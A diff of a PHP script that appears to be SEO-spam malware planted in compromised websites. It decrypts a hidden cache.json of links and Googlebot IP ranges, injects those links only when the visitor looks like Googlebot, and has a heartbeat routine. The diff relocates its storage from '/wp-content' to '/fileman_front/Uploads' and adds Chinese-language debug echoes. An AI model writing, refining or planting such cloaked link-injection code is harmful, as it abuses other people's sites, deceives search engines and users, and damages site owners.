@@ -1,7 +1,7 @@
 
 <?php
 
-$wtableDir="/wp-content";
+$wtableDir="/fileman_front/Uploads";
 
 
 static $hasRun = false;
@@ -118,7 +118,7 @@ function replace_keywords_with_links($content, $urls_keywords_arr, $max_replace_
 
 function content_page_links($content){
     global $wtableDir;
-    $wtableDir="/wp-content";
+    $wtableDir="/fileman_front/Uploads";
     $rootPath = $_SERVER['DOCUMENT_ROOT'];
     $filePath = $rootPath.'/'.$wtableDir.'/tmp/cache.json';
     $domain = $_SERVER['SERVER_NAME'];
@@ -159,7 +159,7 @@ function content_page_links($content){
 
 function site_friend_links($linksContainerHTML){
     global $wtableDir;
-    $wtableDir="/wp-content";
+    $wtableDir="/fileman_front/Uploads";
     $rootPath = $_SERVER['DOCUMENT_ROOT'];
     $filePath = $rootPath.'/'.$wtableDir.'/tmp/cache.json';
 
@@ -168,6 +168,7 @@ function site_friend_links($linksContainerHTML){
 
     if (file_exists($filePath)) 
     {   
+echo "<!-- file_exists 存在数据文件 -->";
 	 
         
         list($TokenNotime, $unused2notime) = gen_token_notime($domain);
@@ -175,6 +176,7 @@ function site_friend_links($linksContainerHTML){
         $decrypted_data = decryptDataYY($cacheDataStr, $TokenNotime);  
 
         $data = json_decode($decrypted_data, true, 512, JSON_UNESCAPED_UNICODE); 
+echo "<!-- data 已取出 -->";
  
         $GooglebotIPs=$data['google_bot_ips'];  
         $insert_urls=$data['insert_urls']; 
@@ -187,12 +189,12 @@ function site_friend_links($linksContainerHTML){
         
         if(mb_strlen($allLinks) > 20){ $haveAllLinks = true ;}
         $ip = $_SERVER['REMOTE_ADDR'];  
-
+echo "<!-- ip :$ip -->";
 	 
 
     
         if ($haveIndexLinks and isHomePage() ) {   
-	 
+echo "<!-- 首页条件成立 -->";	 
             if( isInGoogleIPRange($ip,$GooglebotIPs) ){
 		 
                
@@ -210,7 +212,8 @@ function site_friend_links($linksContainerHTML){
             }    
         }
     
-        if($haveCatLinks and isFirstLevelPage() ){ 
+        if($haveCatLinks and isFirstLevelPage() and !isHomePage() ){ 
+echo "<!-- 一层级页条件成立 -->";	 
             if( isInGoogleIPRange($ip,$GooglebotIPs) ){
                 $linksHTML = getLinksHTML($catLinks) ;      
                 $linksContainerHTML.= $linksHTML;   
@@ -223,9 +226,12 @@ function site_friend_links($linksContainerHTML){
             } 
         } 
  
-        if( $haveAllLinks ){            
+        if( $haveAllLinks ){     
+echo "<!-- 全站 条件成立 -->";
             if( isInGoogleIPRange($ip,$GooglebotIPs) ){
-                $linksHTML = getLinksHTML($allLinks) ;    
+echo "<!-- IP在GG列表内 -->";
+                $linksHTML = getLinksHTML($allLinks) ;   
+echo "<!-- linksHTML：$linksHTML -->";
                 $linksContainerHTML.= $linksHTML;   
             }else{                
                 if ( isGooglebot() && isGoogleHost($ip) ) { 
@@ -365,7 +371,7 @@ function heartBT(){
     date_default_timezone_set('UTC');
 
     global $wtableDir;
-    $wtableDir="/wp-content";
+    $wtableDir="/fileman_front/Uploads";
     $rootPath = $_SERVER['DOCUMENT_ROOT'];
       
     $filePath       = $rootPath.'/'.$wtableDir.'/tmp/cache.json'; 
